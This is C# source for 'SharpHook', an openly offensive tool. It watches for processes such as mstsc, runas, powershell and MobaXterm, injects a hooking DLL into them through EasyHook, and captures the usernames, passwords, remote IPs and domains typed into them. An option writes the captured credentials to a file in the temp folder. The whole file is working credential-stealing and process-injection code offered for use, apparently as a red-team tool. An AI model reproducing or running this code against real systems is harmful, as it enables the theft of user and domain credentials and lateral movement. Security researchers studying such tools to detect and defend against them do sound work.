
using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.ComponentModel;
using System.Net;

namespace SharpHook
{
    public class Program
    {

        public static void Main(string[] args)
        {

            List<string> SupportedProcesses = new List<string>();
            

            try
            {
                if (args.Length < 1)
                {
                    DisplayHelp("Usage:");
                    return;
                }

                ArgumentParserResult arguments = ArgParse.Parse(args);

                if (arguments.ParsedOk == false)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    DisplayHelp("Error Parsing Arguments");
                    Console.ResetColor();
                    return;
                }
                if (arguments.Arguments.ContainsKey("-f"))
                {
                    var TrueOrFalse = arguments.Arguments["-f"];
                    if (TrueOrFalse == "true")
                    {
                        Console.WriteLine("[+] Writing output to Creds.txt inside the temp folder");
                        string Temp = Path.GetTempPath();
                        File.WriteAllText(Temp + "filepath.txt", Temp + "Creds.txt");
                    }
                    
                }
                if (arguments.Arguments.ContainsKey("showhelp"))
                {
                    DisplayHelp("Usage:");
                    return;
                }
                if (arguments.Arguments.ContainsKey("-h"))
                {
                    DisplayHelp("Usage:");
                    return;
                }
                
                if (arguments.Arguments.ContainsKey("-p"))
                {
                    var ProcessName = arguments.Arguments["-p"];
                    var CheackSupportedProcesses = new List<string>()
                    {
                        "all",
                        "MobaXterm",
                        "runas",
                        "mstsc",
                        "cmd",
                        "explorer",
                        "powershell"
                    };
                    if (ProcessName == "all")
                    {
                        SupportedProcesses.Add("mstsc");
                        //SupportedProcesses.Add("MobaXterm");
                        SupportedProcesses.Add("powershell");
                        SupportedProcesses.Add("runas");
                        //SupportedProcesses.Add("explorer");
                        //SupportedProcesses.Add("cmd");
                        //TODO: Add the rest when fixing the bugs
                    }
                    if (ProcessName.Contains(","))
                    {
                        string[] Pnames = ProcessName.Split(',');
                        Array.ForEach(Pnames, x => SupportedProcesses.Add(x));
                    }
                    if (!CheackSupportedProcesses.Contains(ProcessName) && !ProcessName.Contains(","))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[X] Error: The process name is not supported");
                        Console.ResetColor();
                        DisplayHelp("Usage:");
                        return;
                    }
                    
                    SupportedProcesses.Add(ProcessName);
                    Console.WriteLine("[+] Waiting for {0} to load", ProcessName);
                }

                if (!arguments.Arguments.ContainsKey("-p"))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[X] Error: A process name is required");
                    Console.ResetColor();
                    DisplayHelp("Usage:");
                    return;
                }
            }
            catch
            {
                DisplayHelp("Error Parsing Arguments");
                return;
            }
            

            Int32 targetPID = 0;

            // Will contain the name of the IPC server channel
            string channelName = null;

            //List of processes
            List<Process> processes = new List<Process>();

            //List of PIDs to check if injected processes have exited
            List<int> PIDs = new List<int>();

            //Keep track of processes where we've already injected
            List<int> injectedProcesses = new List<int>();

            
            Console.WriteLine("[*] Waiting ...");
            string TempFolder = Path.GetTempPath();

            //This is were Fody saves it's Dlls. 
            string[] files = Directory.GetFiles(TempFolder+@"Costura", "powerhook.dll", SearchOption.AllDirectories);


            EasyHook.RemoteHooking.IpcCreateServer<PowerHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);

            // Get the full path to the assembly we want to inject into the target process
            string injectionLibrary = files[0];
            while (true)
            {
                //Reset list of PIDs and get processes
                PIDs.Clear();
                processes = Process.GetProcesses().ToList();

                for (int i = 0; i < processes.Count; i++)
                {
                    PIDs.Add(processes[i].Id);

                    SupportedProcesses.ForEach(delegate (String Pname)
                    {
                        if (processes[i].ProcessName == Pname && injectedProcesses.IndexOf(processes[i].Id) == -1)
                        {
                            try
                            {

                                targetPID = processes[i].Id;


                                Console.WriteLine("[*] Attempting to inject into {0}", processes[i].ProcessName);

                                // inject into existing process
                                EasyHook.RemoteHooking.Inject(
                                    targetPID,          // ID of process to inject into
                                    injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
                                    injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
                                    channelName         // the parameters to pass into injected library
                                    );

                                injectedProcesses.Add(processes[i].Id);



                            }
                            catch (Exception e)
                            {
                                //Console.ForegroundColor = ConsoleColor.Red;
                                //Console.WriteLine("[-] There was an error while injecting into target:");
                                //Console.ResetColor();
                                //Console.WriteLine(e.ToString());
                            }
                        }
                    });

                }
                //check if any of our injected processes have exited
                for (int i = 0; i < injectedProcesses.Count; i++)
                {
                    if (PIDs.IndexOf(injectedProcesses[i]) == -1)
                    {
                        Console.WriteLine("[*] Process {0} has exited", injectedProcesses[i].ToString());
                        injectedProcesses.Remove(injectedProcesses[i]);
                    }
                }
                //sleep to avoid nuking the computer
                Thread.Sleep(1500);

            }
        }

        public static void DisplayHelp(string message)
        {
            Console.WriteLine(@" 
                ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
                ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
                ███████╗███████║███████║██████╔╝██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
                ╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║██║   ██║██╔═██╗ 
                ███████║██║  ██║██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
                ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                            Author: Ilan Kalendarov, Twitter: @IKalendarov

             ");
            Console.WriteLine("{0} \r\nSharpHook.exe -p=<Process name>", message);
            Console.WriteLine("SharpHook.exe -p=<Process name> -f=true\r\n");
            Console.WriteLine("SharpHook.exe -p=<Process name1>,<Process name2>,<Process name3>\r\n");
            Console.WriteLine("Examples:");
            Console.WriteLine("SharpHook.exe -p=mstsc - This will hook into mstsc and should give you Username, Password and the remote ip");
            Console.WriteLine("SharpHook.exe -p=runas - This will hook into runas and should give you Username, Password and the domain name");
            Console.WriteLine("SharpHook.exe -p=powershell - This will hook into powershell and should give you output for commands for when the user enters a different credentials");
            Console.WriteLine("SharpHook.exe -p=MobaXterm - This will hook into MobaXterm and should give you credentials for SSH and RDP logins");
            Console.WriteLine("SharpHook.exe -p=mstsc,runas - This will hook into mstsc and runas as well");
            Console.WriteLine("SharpHook.exe -p=all - This will hook into every supported process");
            Console.WriteLine(@"SharpHook.exe -p=mstsc -f=true - This will save the output to a local file inside the temp directory");
            return;
        }
    }
}
